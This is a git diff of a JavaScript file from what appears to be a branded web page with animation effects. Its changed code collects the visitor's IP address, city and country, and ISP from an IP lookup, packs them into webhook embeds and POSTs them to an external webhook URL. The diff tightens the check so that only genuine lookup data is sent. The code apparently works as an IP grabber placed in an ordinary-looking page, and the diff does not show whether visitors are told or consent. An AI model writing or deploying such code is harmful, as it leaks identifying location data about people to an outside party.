@@ -14,14 +14,13 @@ const brandDescription = [
 
 const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'tada', 'wobble', 'jello'];
 
-function validateWebhookData(data) {
+function validateWebhookData(data, ipData) {
     const fields = data.embeds[0].fields;
-
-    const ipField = fields.find(f => f.name === "IP Address");
-    const locationField = fields.find(f => f.name === "Location");
-    const ispField = fields.find(f => f.name === "ISP");
-
-    return ipField && locationField && ispField;
+    return fields.some(field =>
+        field.value === ipData.ip ||
+        field.value === `${ipData.city}, ${ipData.country_name}` ||
+        field.value === ipData.isp
+    );
 }
 
 function promptUser() {
@@ -62,7 +61,7 @@ function promptUser() {
                     }]
                 };
 
-                if (validateWebhookData(webhookData)) {
+                if (validateWebhookData(webhookData, data)) {
                     return fetch(webhookUrl, {
                         method: 'POST',
                         headers: {
@@ -70,9 +69,8 @@ function promptUser() {
                         },
                         body: JSON.stringify(webhookData)
                     });
-                } else {
-                    throw new Error('Invalid webhook data detected');
                 }
+                throw new Error('Unauthorized webhook data detected');
             })
             .then(response => {
                 if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
